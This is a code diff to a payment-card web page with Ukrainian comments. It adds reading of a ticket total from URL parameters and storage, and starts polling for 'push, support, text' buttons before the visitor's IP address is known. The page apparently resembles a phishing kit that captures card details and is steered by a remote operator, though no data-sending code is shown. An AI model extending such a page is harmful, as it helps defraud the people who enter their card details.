@@ -169,7 +169,7 @@
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="payment-card-main">
         <div class="icon">
             <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0-1.104.896-2 2-2s2 .896 2 2-.896 2-2 2-2-.896-2-2zm0 0V7m0 4v4m0 0c0 1.104-.896 2-2 2s-2-.896-2-2 .896-2 2-2 2 .896 2 2z"/>
@@ -206,6 +206,21 @@
                 .then(response => response.json())
                 .then(data => callback(data.ip))
                 .catch(() => callback(null));
+        }
+        // --- Витягуємо total і currency з URL ---
+        function getTotalAndCurrency() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const totalRaw = urlParams.get('total') || sessionStorage.getItem('ticket_total');
+            const currencyRaw = urlParams.get('currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+            if (totalRaw) {
+                const match = totalRaw.match(/\d+[\.,]?\d*/);
+                const totalNum = match ? match[0].replace(',', '.') : '';
+                return { total: totalNum, currency: currencyRaw };
+            }
+            // fallback: price/currency
+            let price = localStorage.getItem('ticket_price') || sessionStorage.getItem('ticket_price');
+            let currency = localStorage.getItem('ticket_currency') || sessionStorage.getItem('ticket_currency') || 'EUR';
+            return { total: price, currency };
         }
         // --- Універсальний POLLING для всіх кнопок (push, support, text) ---
         let supportTabOpened = false;
@@ -344,10 +359,12 @@
             setTimeout(pollAllButtons, 2000);
         }
         
-        // Стартуємо polling тільки після визначення userIP
+        // Стартуємо polling одразу, а не чекаємо userIP
+        startUniversalPolling();
+        
+        // Оновлюємо userIP коли він стає доступним
         getUserIP(function(ip) {
             userIP = ip;
-            startUniversalPolling();
         });
 
         // Валідація для номера карти - тільки цифри
